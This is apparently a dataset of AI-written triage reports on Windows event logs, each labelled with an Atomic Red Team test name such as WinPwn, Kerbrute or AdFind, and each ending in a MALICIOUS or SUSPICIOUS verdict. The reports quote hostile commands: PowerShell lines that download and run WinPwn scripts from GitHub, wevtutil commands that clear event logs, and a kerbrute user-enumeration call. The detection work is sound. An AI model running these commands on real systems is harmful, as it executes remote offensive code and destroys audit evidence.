Further actions should include revisiting user access and privilege policies, especially on high-value targets such as the CEO’s machine, to strengthen monitoring and incident detection capabilities."
BIOS Information Discovery through Registry,"Upon examining the provided logs, certain events stand out as potential indicators of suspicious and possibly malicious activity:

1. **Event Log Clearing:** There are indications that `admin_test` cleared multiple event logs, an action that is often associated with attempts to cover up unauthorized activity.
   - **Security log cleared:** Event ID 1102 (Security) indicates that the security event log was cleared by a user with `SubjectUserName` as `admin_test`.
   - **Application and System logs cleared:** Event ID 104 (System) shows the same user cleared these logs as well.
   - Log clearing without an obvious legitimate reason is often suspicious, especially when multiple logs are involved.

2. **Process Execution:** The logs show a series of command-line utility executions related to event logs:
   - **Wevtutil.exe Usage:** The use of `wevtutil.exe` to clear event logs (as seen in the Sysmon logs) by the user `admin_test` reinforces the suspicion of log tampering.
   - The sequence of `wevtutil.exe` instances targeting different channels (`Security`, `Application`, `System`, and `Windows PowerShell`) indicates a systematic attempt to remove traces from the event logs.

3. **Command Execution from Unknown Context:**
   - The `cmd.exe` execution with registry queries in the command line (Sysmon logs) might suggest system reconnaissance or preparation for further compromise.
   - The context of these commands doesn't provide enough clarity about the legitimate administrative need for such actions, making them suspicious.

4. **Edge Update Activity:** A significant number of processes related to Microsoft Edge Update are recorded, including instances launched from a temporary directory.
   - While updating software is common, the frequency and multiple command-line arguments observed, such as `/regsvc`, `/regserver`, `/ua`, etc., without a noted update schedule, raise suspicion of unauthorized software execution attempts.

5. **Privilege and User Context:**
   - Elevated Integrity Levels and the SYSTEM user context on several processes might indicate attempts to escalate privileges or execute high-level system changes, especially when these are processes associated with typical user-level applications.

### Assessment:
Based on the evidence provided, the activities observed are suspicious. The log-clearing events, in particular, are indicative of attempts to cover tracks, a tactic commonly seen in malicious behavior. However, without additional forensic evidence or context (like system-specific policies), it is challenging to conclusively assert that these actions were definitively malicious.

### Resolution:
- **SUSPICIOUS:** The activities in the logs do not clearly confirm malicious intent beyond doubt but warrant further investigation due to the log-clearing actions and unusual process executions.

### Guidance:
- Conduct a deeper forensic analysis to ascertain the legitimacy of the `admin_test` user's actions.
- Correlate with network logs, and endpoint security alerts to identify if there were any unauthorized access attempts.
- Review software update schedules and permissions for irregularities or unauthorized adjustments.
- Educate the administrator team about the significance of event logs and alert them to risky practices such as unnecessary log clearing."
Packet Capture Windows Command Prompt,"**Analysis of Windows Event Logs**

**1. Overview and Identification of Events:**
- **Sysmon Events:**
  - Multiple instances of processes like `powershell.exe`, `wevtutil.exe`, and `cmd.exe` are observed in close temporal proximity.
  - Frequent calls to `wevtutil.exe` with command-line arguments indicating attempts to clear event logs (e.g., `cl Microsoft-Windows-Sysmon/Operational`).
  - Instances of software installation processes such as `wireshark_installer.exe`, executed via PowerShell, potentially indicating software installation or script execution.
  - An observed use of command-line parameters that involve external networks and directory creation (`Invoke-WebRequest` to download `wireshark_installer.exe`).

- **System and Security Logs:**
  - Clear evidence of log clearance activities (Event ID 104 in System and Event ID 1102 in Security logs), with the user 'admin_test' executing these actions.
  - These actions are highly suspicious, as they can be indicative of attempts to cover tracks post-compromise.

- **PowerShell Logs:**
  - Execution of PowerShell scripts to download and execute software from an external source, which may suggest downloading potentially unwanted software or malware.

- **Application Logs:**
  - Instances indicating the execution of Visual C++ redistributable installations potentially related to legitimate software installation like Wireshark.

**2. Assessment of Malicious Activity:**
- **Exploitation Techniques:**
  - **Log Clearance:** The events show specific log clearance operations using `wevtutil.exe` and direct attempts to clear Windows event logs. This is a common method used by threat actors to evade detection and impede forensic analysis.
  - **PowerShell Use:** The PowerShell activity indicates automated script execution to download and silently install software from the internet. In the context of potential misuse, this could be part of a larger script or exploit chain aiming to introduce malicious payloads.

**3. Indicators of Compromise:**
- The frequency and nature of these activities suggest an attempt at maintaining persistence post-compromise (e.g., through software installation) and obfuscation through log cleaning.
- The logs show the behavior of a user account (`admin_test`) executing potentially malicious activities with high integrity level access, which aligns with actions performed by malicious insiders or compromised accounts.

**Conclusion:**
- **Resolution:** **MALICIOUS**
- **Rationale:**
  - The combination of clearing event logs (an indicator of anti-forensics) and possible execution of unauthorized software installations (indicative of an intrusion attempt) is strongly suggestive of malicious activity.
  - Given the context of the sensitive user environment (the CEO's machine) and the high-integrity level access, these actions could compromise sensitive data or systems.

**Guidance:**
- Immediate action should be taken to isolate the affected system to prevent further damage.
- Conduct full forensic analysis to determine the source of execution for these activities.
- Review user permissions and credentials for `admin_test` and reset if necessary.

WinPwn - PowerSharpPack - Seatbelt,"Upon analyzing the provided logs from the Windows host, several indicators of potentially malicious activity are observed, suggesting a compromise of the system.

1. **Event Log Clearing**:
   - **Security Log EventID 1102** and **System Log EventID 104**: The presence of log clearing events, especially in security and system logs, is highly suspicious. It indicates attempts to erase tracks, commonly associated with malicious actors post-exploitation to hide their activities.

2. **PowerShell Activity**:
   - **PowerShell Events**: Multiple instances of PowerShell execution involve downloading and executing scripts from an external source (""https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1""). The usage of `iex` (Invoke-Expression) to execute content fetched from the web raises a significant red flag, as this method can be used to run potentially harmful commands or scripts on a system.
   - The specific script ""Invoke-Seatbelt"" is a known post-exploitation tool to gather information from Windows systems, typically used by attackers during a reconnaissance phase.

3. **Wevtutil Usage**:
   - **Sysmon Log Events**: The logs show multiple instances of `wevtutil.exe` (Eventing Command Line Utility) usage, particularly around clearing different event logs (`cl` command), aligning with the detected log clear events. This behavior reinforces the suspicion of malicious activity aimed at covering tracks.

4. **Unauthorized Privilege Change**:
   - Although not directly logged in the given events, the observed activities like unauthorized script execution and event log clearing strongly imply unauthorized access or privilege escalation.

5. **Edge Update Anomalies**:
   - **Sysmon Log Events**: Numerous executions of Microsoft Edge Update components under the NT AUTHORITY\SYSTEM context seem regular; however, considering the suspicious context of other events, they might signify an attempt at utilizing legitimate processes to execute or hide malicious activity, a technique known as ""Living off the Land"" (LotL).

### Assessment and Resolution

Based on the observed evidence of log tampering, suspicious PowerShell activity, and the use of known post-exploitation tools, the behavior captured in these logs indicates a compromise. The nature of actions being taken, such as clearing logs and executing potentially harmful scripts, strongly suggests malicious intent.

DNS Server Discovery Using nslookup,"Upon examining the provided Windows event logs, several indicators suggest potentially malicious activity that warrants further investigation. Here's a detailed breakdown of the findings:

### Analysis of Logs

1. **Event Reduction/Clearance:**
   - System Event ID 104: Logging indicates the clearing of the System and Windows PowerShell event logs by the user ""admin_test"" at a specific timestamp. Clearing of event logs can be an indication that a user attempted to cover their tracks post-execution of an activity.

2. **Security Log Cleared:**
   - Security Event ID 1102: The security event log was cleared, which is a significant indicator of suspicion as this can be associated with malicious activities aimed at removing evidence of previous actions on the system. 

3. **Sysmon Logs:**
   - Numerous `wevtutil.exe` processes are executed in rapid succession. This command-line utility is used for managing event logs and is prominently used to clear event logs in suspicious scenarios.
   - The `whoami.exe`, `conhost.exe`, and similar command executions could likely be benign or part of regular activity, but given the context of log clearing, they should be scrutinized.
   - `nslookup` with specific parameters in the command-line arguments. This could be indicative of domain enumeration or testing network boundaries if conducted shortly after log clearing.

4. **Updates and System Tasks:**
   - Windows Update and related processes such as `wuauclt.exe` and `dllhost.exe`, `MusNotification.exe`, and updates to Microsoft Defender Antivirus show normal background activity, but the context does not indicate malicious behavior.

5. **Unusual Command Execution:**
   - The execution of PowerShell and `wevtutil.exe` along with the sequence and timing close to log clearing are classic signs of an attempt to obfuscate malicious actions.

### Threats or Risks Identified

- **Log Cleansing:** Intensive log manipulation and clearance suggest an attempt to hide malicious activities, potentially attributed to a breach or misuse of privileges.
- **Potential File Deletion Risk:** The clearing of logs without apparent legitimate reason signifies possible data exfiltration or execution of unauthorized scripts/routes through which the threat could be established.
- **User Monitoring:** Activities tied to the user `admin_test` show anomalous behavior; further observation or analysis of user activity and potential isolation may be required.

### Conclusion

Given these findings, the resolution for this analysis is **MALICIOUS**. The activities observed in the logs consistently align with malicious behavior, particularly the log clearing actions, which suggest attempts to cover unauthorized activities. It is imperative that immediate steps include:

- **Implement Incident Response:** Audit the affected system thoroughly to uncover any unauthorized changes or data exfiltration attempts.
- **Strengthen Monitoring Tools:** Ensure that audit logging and retention is tightly controlled to prevent unauthorized deletions.
- **User Verification and Access Control:** Verify the actions taken by ""admin_test"" and reassess access permissions.
- **Deep Analysis:** Conduct a thorough malware scan and integrity check on critical system files and applications.

This scenario should lead to heightened scrutiny and secure posturing of the system and related infrastructure."
Examine local password policy - Windows,"Upon reviewing the provided logs, several key pieces of information suggest potentially suspicious activities on the host ""Server002,"" which is notably the machine used by the CEO:

### Key Observations:

1. **Log Clearing Activity:**
   - The logs show multiple entries indicating the clearing of event logs (`System`, `Windows PowerShell`, and `Security` logs) using `wevtutil.exe`. This is reflected in both the ""System log"" and ""Security log"" with EventID `104` and `1102`, respectively.
   - Specifically, the account `SERVER002\admin_test` executed the command to clear these logs, which is commonly observed in attempts to cover malicious activities.

2. **Suspicious Command Execution:**
   - The `Sysmon log` shows the invocation of several system utilities in quick succession, including `cmd.exe` executing `net accounts` commands. This behavior may indicate information gathering or reconnaissance activity.
   - There are also multiple instances of `whoami.exe` and `hostname.exe` executed, which might be used to gather information about the current user context and machine details.

3. **High Privilege Use by Non-System Processes:**
   - The user associated with the log-clearing operation has a high integrity level, indicating elevated privileges, which aligns with the `admin_test` account's actions not typical for routine operational procedures.

4. **Edge Update Activities:**
   - Extensive logging related to `MicrosoftEdgeUpdate.exe` processes indicates a routine update cycle but does not directly correlate with the suspicious timing of log clearing activities.

### Assessment:
The combination of system log clearing, indicative privilege use, and suspicious command execution, primarily under the admin_test account, signals behavior consistent with malicious activity.

### Recommended Action:
- Perform a comprehensive review of the `admin_test` account usage and confirm its legitimacy and recent actions.
- Check for anomalous network activity or data exfiltration that might coincide with these log events.
- Preserve and review any backups of the logs prior to clearing if available.
- Consider isolating the affected machine (""Server002"") from the network for a deeper forensic investigation.
- Enhance monitoring on high-value accounts and implement additional alerting for critical actions such as log clearing.

### Resolution:
- **MALICIOUS**: The events observed in the logs, especially the systematic clearing of multiple critical logs by the `admin_test` account, strongly suggest intent to conceal malicious activities. The need for further action and a thorough investigation into the system and account is warranted."
WinPwn - GPOAudit,"Based on the provided Windows event logs, we can make the following observations:

1. **PowerShell Log Analysis:**
   - There are multiple entries in the PowerShell logs indicating the execution of a script from a GitHub repository by `S3cur3Th1sSh1t`, specifically the `WinPwn.ps1` script. This is being executed via PowerShell with the command:
     ```powershell
     $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
     GPOAudit -noninteractive -consoleoutput
     ```
   - The use of `iex (Invoke-Expression)` with `net.webclient` to download and execute a script from the internet is highly suspicious and a common sign of malicious activity, particularly in penetration testing or exploitation contexts.

2. **Application Log Analysis:**
   - There are logs indicating that Windows Defender is activated and currently in security product state ""ON"". No suspicious activity is identified from these entries alone. However, having Defender on does not negate malicious activity detected elsewhere.

3. **Sysmon Log Analysis:**
   - The process activity for PowerShell and its unusual command-line usage are consistent with the suspicious PowerShell activities identified.
   - Numerous processes (`wevtutil`, `conhost`, `hostname`, `whoami`) are involved in a sequence that appears orchestrated, possibly as part of script execution or a larger automated sequence.
   - It's also notable that `wevtutil` was used to clear event logs: 
     ```cmd
     ""C:\Windows\system32\wevtutil.exe"" cl ""Security""
     ""C:\Windows\system32\wevtutil.exe"" cl System
     ""C:\Windows\system32\wevtutil.exe"" cl ""Windows PowerShell""
     ```
   - The clearing of event logs via `wevtutil` is a red flag indicating potential cover-up of tracks, often associated with malicious activity.

4. **Security Log Analysis:**
   - Event 1102 indicating that the security log was cleared is alarming. This action typically signifies an attempt to erase traces of activity, suggesting potential malicious behavior.
   - The user associated with the clearing of logs is `admin_test` on `SERVER002`.

5. **System Log Analysis:**
   - Similar to the security logs, the system logs were cleared. This is generally indicative of an attempt to hide unauthorized or malicious actions.
   
**Assessment:**
There is clear evidence of suspicious and potentially malicious activity within these logs. The PowerShell script execution from an online repository, particularly one associated with penetration testing or exploitation tools, combined with the clearing of various critical event logs, strongly indicate a compromise or at least attempted compromise of the system.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent any potential spread of malicious activity.
  
2. **Detailed Forensic Analysis:**
   - Conduct a full forensic investigation of `Server002` to determine the extent of the compromise, including memory analysis and full disk examination.

   - Review and, if necessary, enhance security configurations on PowerShell and other administrative tools. 

6. **User Training and Awareness:**
   - Educate users about the risks of downloading and executing scripts from unknown or unverified sources, even for those with administrative privileges.

These steps are crucial to mitigate the identified risk and prevent future incidents."
WinPwn - DotNet,"Upon reviewing the provided logs, several indicators suggest potential malicious activity taking place on the Windows host ""Server002."" I will highlight the suspicious activities identified across different logs:

### 1. Windows PowerShell Logs:
- In the PowerShell logs, there is evidence of a command line execution that downloads and executes a script, ""WinPwn.ps1,"" from a GitHub repository. The command used is:
  ```powershell
  powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')}
  ```
  This behavior is highly suspicious as it involves downloading and running scripts from potentially untrusted sources on the internet, a common technique used in cyber-attacks to execute malicious payloads.

### 2. Security Logs:
- Event ID 1102 indicates that the security logs were cleared, as executed by the user ""admin_test"" through Process ID 4280. Clearing logs can be a tactic used by adversaries to erase traces of their activities after a breach.
- Additionally, there is manipulation of time settings (Event ID 4616) where the system time was altered, potentially to evade detection mechanisms that rely on timestamps.

### 3. System Logs:
- Similar to the security logs, the system logs were also cleared (Event ID 104) by the same user, ""admin_test,"" and executed through different processes, including Wevtutil.exe, which can be used to alter or delete event logs.

### 4. Sysmon Logs:
- There is consistent activity of clearing event logs using `wevtutil.exe` across various logs like ""Microsoft-Windows-Sysmon/Operational"", ""System"", and ""Security"". This suggests a systematic attempt to erase traces of potentially illegitimate or malicious operations.
- High integrity processes, such as ""wsmprovhost.exe"" and scripts being executed at such levels, further hint at privilege abuse or a possible compromise.

### Assessment:
The presence of these activities strongly indicates a security compromise due to:
- Downloading and executing scripts from unknown sources.
- Log clearing activities potentially indicating an effort by an attacker to wipe evidence to avoid detection.
- Privilege escalation and unauthorized manipulation of system settings, such as time adjustments.

### Resolution: MALICIOUS
Based on the analysis, the logs contain definitive signs of malicious activity. Immediate actions should include:
- Isolating the affected system to prevent further potential compromise.
- Conducting a thorough forensic investigation to understand the extent of the breach.
- Reviewing all systems for similar indicators of compromise (IoCs).
- Resetting credentials and applying necessary security patches.
- Notifying the relevant stakeholders and, if necessary, law enforcement based on your organization’s policies and the severity of the incident."
Process Discovery - get-wmiObject,"Upon analyzing the provided Windows event logs, several entries raise concerns about potential malicious activity. Key points in the logs include:

1. **Log Clearing Events:**
   - Logs from the System event log show two instances where the logs for the ""System"" and ""Windows PowerShell"" channels were cleared by the user ""admin_test"". This activity was performed using the `wevtutil.exe` utility, which is a legitimate Windows tool but can be misused for covering tracks after malicious actions. 

2. **Frequent Use of System Utilities:**
   - There are multiple instances of `wevtutil.exe` being executed to clear different event log channels (System, Application, Windows PowerShell, Security). Such activity could indicate an attempt to hide unauthorized actions or traces of malicious behavior.

3. **Suspicious Command Execution:**
   - The presence of PowerShell activities with the command `get-wmiObject -class Win32_Process` executed by ""admin_test"" could be leveraging PowerShell to enumerate running processes. While this can be legitimate in some contexts, the concurrent clearing of logs after similar activities raises red flags.
   
4. **Privilege Escalation:**
   - Security events indicate that the user ""admin_test"" was assigned elevated privileges such as `SeDebugPrivilege` and `SeBackupPrivilege`, which could be used for malicious purposes if obtained unauthorizedly.
   
5. **Time Manipulation:**
   - There are events indicating changes to the system time. While services like Windows Time Service can adjust system time, unauthorized time changes can be an attempt to disrupt log forensic analyses.

6. **Use of System Utilities:**
   - Various instances of `conhost.exe` attached to different utilities like `wevtutil.exe`, `powershell.exe`, and other common system tasks, in short succession, possibly indicate script-based automated activity.

Assessment & Resolution:

Based on the above observations, particularly the clearing of logs, repeated use of logging utilities, and PowerShell command execution patterns, there are strong indicators of suspicious behavior that may merit further investigation. 

Resolution: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Conduct a Thorough Investigation**: Verify if `admin_test` had legitimate reasons for clearing logs and if their account was compromised.
2. **Incident Response**: Engage your incident response team to begin immediate analysis, including memory analysis and disk forensics to search for traces of malicious scripts or tools.
3. **Review Account Activity**: Check for unusual logins or authentication failures tied to `admin_test` or other critical accounts.
4. **Harden the Environment**: Consider tightening access controls, implementing stricter logging policies, and reviewing endpoint detection and response (EDR) configurations to prevent log tampering.
5. **Monitoring**: Enhance monitoring, especially for privileged accounts and administrative activities across critical systems.
6. **User Awareness**: Educate users on recognizing and reporting suspicious activity, especially around critical operations like log management.
"
System Network Connections Discovery,"Upon reviewing the provided Windows event logs, there are several noteworthy activities that require further analysis:

### Observations and Analysis:

1. **Event Log Clearing**:
   - **System Event ID 104** and **Security Event ID 1102**: These indicate the clearing of Windows event logs.
   - Frequent use of `wevtutil.exe` for clearing logs in the **Sysmon log** associated with `admin_test`:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl ""Windows PowerShell""`
   - Clearing event logs is often indicative of attempts to hide malicious activities. In particular, repeated clearing of various logs within a short time frame by the same user, `admin_test`, is highly suspicious.

2. **Privileges and Logon Events**:
   - **Security Event ID 4672**: Special privileges were assigned to `admin_test`, including `SeDebugPrivilege` and `SeBackupPrivilege`, which are sensitive and powerful security permissions.
   - **Security Event ID 4624 and 4634**: Successful logons and logoff events using NTLM authentication were captured, with activity originating from different IP addresses on the same machine, `DESKTOP-3HL5B2P`. This suggests potential lateral movement or unauthorized access.

3. **Command Line Executions**:
   - **Cmd.exe**: The execution of a command line using `cmd.exe /c netstat & net use & net sessions` suggests network reconnaissance activity. This command sequence is typically used to check network connections, shared resources, and active sessions, which is suspicious, especially following log-clearing activities.
   
4. **Use of Built-in Tools**:
   - **whoami.exe** and **hostname.exe** were executed, which by themselves are common administrative commands. However, their execution in conjunction with event log clearing may indicate attempts to gather system information post-compromise.
   
5. **Microsoft Edge Update Activity**:
   - The execution of Microsoft Edge update process logs indicates software updates, which are normal activities but less relevant to the suspicious behavior already identified.

### Conclusion and Recommendation:

Based on the evidence, such as the pattern of log-clearing using `wevtutil.exe`, the assignment of sensitive privileges, and the execution of network reconnaissance commands, the sequence of activities is indicative of malicious intent, possibly by an insider or an attacker with compromised credentials.

### Resolution: **MALICIOUS**
- **Recommended Actions**:
  1. Conduct an immediate review of user `admin_test` to verify the legitimacy of their actions and access.
  2. Verify network configurations and inspect for unauthorized accounts or lateral movement tactics.
  3. Enhance logging and monitoring mechanisms to detect further suspicious actions.
  4. Review other systems and logs for similar activities to assess the scope of the potential compromise.
  5. Isolate impacted systems and perform a comprehensive security assessment to mitigate further risks.

Given these findings, swift action is advised to mitigate potential breaches and reinforce system security."
WinPwn - General privesc checks,"Based on my analysis of the provided logs, I have identified several areas of concern, distinguishing them between typical system events and potentially malicious activities. Below is a summary:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - The PowerShell log indicates that a script was downloaded and executed from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1`). This form of activity is often associated with malicious behaviors, as loading and executing scripts directly from the internet can bypass security mechanisms. The inclusion of ""WinPwn"" hints that this script may have been used to assess or exploit system weaknesses.

2. **Event Log Clearing:**
   - There are entries in the Security and System logs indicating that the event logs were cleared by the user `admin_test`. Clearing of event logs is a common tactic used by attackers to cover their tracks, suggesting an attempt to hide activities from system administrators.

3. **Sysmon Logs:**
   - Numerous instances of `wevtutil.exe` (an Eventing Command Line Utility) were observed. The clearing activities mentioned above align with the invocation of `wevtutil.exe`, reinforcing the suspicion of malicious intent.
   - The execution of `powershell.exe` with command-line arguments referencing external repository scripts is highly suspicious.

4. **Edge Update Activity:**
   - Various processes related to the Microsoft Edge Update service are logged. While this might be standard operation or updates, it coincides with the timeline of the PowerShell script execution—potentially as a cover or byproduct of compromise.

### Assessment:

The combination of downloading potentially malicious scripts, execution using PowerShell, and the subsequent event log clearance strongly indicates malevolent actions have taken place on the monitored system. These activities are far from typical or benign and suggest either an attacker has accessed the system or a serious misuse by an insider with administrative access.

### Resolution:

**MALICIOUS**

The logs reflect clear indicators of malicious activity. Immediate action is required, which includes:

- Conduct a comprehensive forensic analysis to determine the scope of access and identify any compromised data.
- Review and reset credentials or permissions for the user `admin_test`.
- Isolate the affected system from the network to prevent further unauthorized access.
- Check for persistency mechanisms that might have been established by the script.
- Coordinate a response plan to notify stakeholders and address potential data breaches or compliance issues.

The outlined findings underscore an immediate need for escalation to incident response to prevent potential data breaches, lateral spread, or further unauthorized access."
Adfind - Enumerate Active Directory User Objects,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior

1. **Log File Clearing:**
   - The System, Windows PowerShell, and Security event logs were cleared using the `wevtutil.exe` utility. This is indicated by the multiple instances of `wevtutil.exe` appearing in the Sysmon logs with command lines targeting log channels (e.g., `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`).
   - The log clearing was performed under the user `admin_test` on `SERVER002` with a process running at a high integrity level, indicating administrative privilege.

2. **Command Execution via Unexpected Paths:**
   - A `cmd.exe` process was executed with the command line allowing execution of `AdFind.exe` from a temporary path: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\AdFind.exe`. This behavior suggests that potentially suspicious tools were executed from a non-standard location typically used for temporary files.

3. **Privilege Activity:**
   - A privilege assignment (event 4672) was logged, granting extensive privileges (e.g., SeDebugPrivilege, SeBackupPrivilege), which could indicate privilege escalation or system-level access.

4. **Reconnaissance Tool Execution:**
   - The execution of a command utilizing `AdFind.exe`, known for Active Directory enumeration and often used in offensive security testing and by threat actors as part of reconnaissance processes.

List Mozilla Firefox bookmarks on Windows with command prompt,"Upon analyzing the provided logs, there are a few key points that stand out indicating anomalous and potentially malicious activity:

1. **Log Clearing Activity**:
   - The `Security` log shows events indicating that logs have been cleared. Specifically, Event ID 1102 (""Audit: The audit log was cleared"") is usually a red flag as it can indicate malicious activity trying to cover its tracks. In this case, `admin_test` cleared logs which is suspicious, especially on a high-profile system like the CEO's.

2. **Process and Event Logging**:
   - The Sysmon logs show a pattern of commands run by the user `admin_test` involving the use of `wevtutil` to clear logs such as the System event log and the Windows PowerShell event log. The usage of `wevtutil` with the `cl` (clear) command is typically associated with attempts to hide malicious activities.

3. **Elevation of Privileges**:
   - There are several instances of high-level privileges being assigned (Event ID 4672). While these may be normal for certain system processes, the combination with log clearing makes it worth further investigation.

4. **Suspicious Command-Line Activity**:
   - There's a `cmd.exe` process executing `where /R C:\Users\ places.sqlite` under `admin_test`. The purpose could relate to searching for browser history databases, which could be an attempt to collect reconnaissance information from the host.

Given the above observations, particularly the log clearing activities, unauthorized and suspicious use of process utilities such as `wevtutil`, and high-level privilege assignments in a context that suggests log tampering, these activities raise significant concern.

**Resolution: SUSPICIOUS**
- The activity in the logs appears anomalous and points to potentially malicious behavior, but further investigation is needed to confirm it thoroughly. A detailed forensic analysis should be undertaken to determine the context and intent of these activities. This should be followed by reinforcing logging configurations and reviewing access and privilege settings for the admin account on the CEO's machine to mitigate vulnerability to similar incidents."
Kerbrute - userenum,"Based on the analysis of the provided Windows event logs, several indicators suggest potentially malicious activity. Below is a detailed examination of the logs, highlighting the suspicious behavior observed:

1. **PowerShell Execution with Suspicious Command-Line Arguments:**
   - There are multiple entries indicating the execution of PowerShell with command-line instructions involving `kerbrute.exe`, a known tool used for Kerberos brute-force attacks. The command includes parameters to enumerate users against a domain which suggests reconnaissance or attack preparation activity.
   - Example from the logs: `powershell.exe & {cd ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\"", .\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\username.txt""}`

2. **Clearing of Event Logs:**
   - The logs show multiple instances where system, security, and PowerShell event logs were cleared shortly after the suspicious PowerShell execution. This is often an attempt by an attacker to cover their tracks and is a significant indicator of potentially malicious activity.

3. **Wevtutil.exe Usage:**
   - There are multiple invocations of `wevtutil.exe` with command-line arguments to clear logs: `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, which corresponds with the log clearing events recorded. Use of this utility in this manner is commonly associated with malicious activities aiming to hide evidence.

4. **Unhandled Credential Access Attempts:**
   - There are repeated entries in the security log for EventID 5379, which indicate attempts to read credentials in a manner that failed due to permission issues (ReturnCode=3221226021). These entries signify unusual access attempts that are frequent and unsuccessful, suggesting automated processes or brute force techniques.

5. **User Activity Analysis:**
   - The actions were performed by the `admin_test` account, indicating either misuse of a legitimate administrative account or a possible compromise of this account. The high integrity level observed in the entries further suggests elevated privileges during these operations.

In summary, the event logs reveal activities consistent with reconnaissance and operational security measures typically associated with malicious intent, such as the use of `kerbrute.exe` for user enumeration and log clearance using `wevtutil.exe`. Combined with attempts to access credentials improperly, the pattern of activity represents a coordinated effort to both explore the security posture of the host and obscure these actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected computer from the network to prevent further potential unauthorized access or data exfiltration.
- Conduct a detailed forensic analysis on the affected host to determine the extent of the compromise and any potential data breaches.

Process Discovery - tasklist,"Upon review of the provided Windows event logs, several aspects of suspicious and potentially malicious behavior are observed:

1. **Log Clearing Activities:**
   - Multiple Event IDs 104 from the System log and one Event ID 1102 from the Security log indicate that the logs for the System, Windows PowerShell, and Security channels were cleared. Such activities usually denote an attempt to hide malicious activities or traces left by an attacker. The clearing was carried out by the user ""admin_test"".

2. **System Time Manipulation:**
   - Event ID 4616 from the Security log shows that the system time was altered. This may be an attempt to defeat time-based analysis or logging, often a tactic used by attackers to confuse timeline analysis or cover tracks.

3. **Suspicious Commands and Processes:**
   - The Sysmon logs show the execution of commands and use of `wevtutil.exe` to clear logs. This aligns with the log clearing activities seen in the System and Security logs.
   - The execution of other utilities like `whoami.exe` and `tasklist.exe` may indicate reconnaissance actions. While these tools are built-in, their execution, particularly prompt `cmd.exe` checks like task lists, could reflect information gathering by a threat actor.

4. **Administrative Tools Usage:**
   - Many of the suspicious actions such as altering logs and querying system status appear to be executed under the integrity level of ""High"", implying the use of administrative privileges which were likely misused.

5. **Audit Logs:**
   - The series of actions occur around the same time (timestamps around ""2024-10-22 19:11:08"" to ""2024-10-22 19:11:30""), which suggests a deliberate operation rather than routine activities.

### Assessment and Conclusion:
The patterns observed in the logs—particularly the clearing of multiple logs, manipulation of system time, and the use of admin-level tools and commands in succession—provide strong indicators of malicious activity. The use of system utilities and tools in the given manner, while typical for administrative tasks, is consistent with attempts to evade detection and could be part of an attacker's technique to maintain persistence or exfiltrate data while avoiding system defenses.

### Guidance & Resolution:
- **Resolution:** MALICIOUS
- **Immediate Actions:**
  - Perform a comprehensive security audit and investigation to assess any additional suspicious actions or breaches.
  - Review user account ""admin_test"" for unauthorized access or misuse and consider revoking privileges while the investigation is ongoing.
  - Ensure all logging mechanisms are intact after the clearing and check for any recent anomalies that might have been hidden by the clearing activity.
  - Investigate potential access points or vulnerabilities that may have been exploited.
  - Consider enabling enhanced logging and real-time monitoring to prevent future incidents.
- Given the devious nature of these activities, it is recommended to thoroughly scan and possibly isolate the affected systems to prevent further compromise or spread across the network."
Applications Installed,"**Analysis of Windows Event Logs:**

The provided logs contain several entries that indicate potentially suspicious behavior. The main points to analyze are as follows:

1. **Log File Clearing Events:**
   - Multiple log clearing events are recorded involving the same user `admin_test`. This kind of activity often indicates attempts to cover tracks after performing potentially unauthorized or malicious activities. 
   - The events with EventID ""104"" in the System log indicate that logs associated with the ""System"" and ""Windows PowerShell"" channels were cleared.
   - The Security log contains EventID ""1102"", indicating that the Security log itself was cleared.

2. **Process Execution and Command Line:**
   - There are multiple instances of `wevtutil.exe` command execution. This utility is used to manage event logs and could be benign but is suspicious in combination with log clearing.
   - The Sysmon logs show `wevtutil.exe` executed several times with the argument `cl` which stands for ""clear log"". This aligns with the observed log clearing events.

3. **PowerShell Activity:**
   - The PowerShell logs show the execution of commands designed to list installed software. This is a common reconnaissance action often carried out by attackers or intrusion scripts.
   - The attempt to hide activities using PowerShell in combination with log clearing is suspicious.

4. **Time Change Events:**
   - Events with EventID ""4616"" in the Security log suggest adjustments to the system time. While this can occur for legitimate reasons, it is unusual if performed without valid context or administrative justification, as it may be an attempt to desynchronize logs and thwart time-based correlation.

5. **Sysmon Activity:**
   - Regular command-line utilities, such as `hostname.exe` and `whoami.exe`, being used might appear benign alone. However, in conjunction with other suspicious activities, these might be part of a larger script or manual efforts to gather system information.

**Assessment of Situation:**
The presence of log clearing attempts combined with reconnaissance activities (via PowerShell) and multiple suspicious command-line executions suggests that there may be an attempt to conduct unauthorized activities on the host while covering tracks.

**Threats or Risks Identified:**
The primary threat detected is the compromise of the system by potentially malicious actors intending to gain intelligence or execute a secondary phase of an attack while trying to remain undetected by clearing logs.

**Guidance on How to Proceed:**

Enumerate Active Directory Computers with Get-AdComputer,"Upon reviewing the provided logs, several points of interest require further analysis:

1. **Log File Clearing Events:**
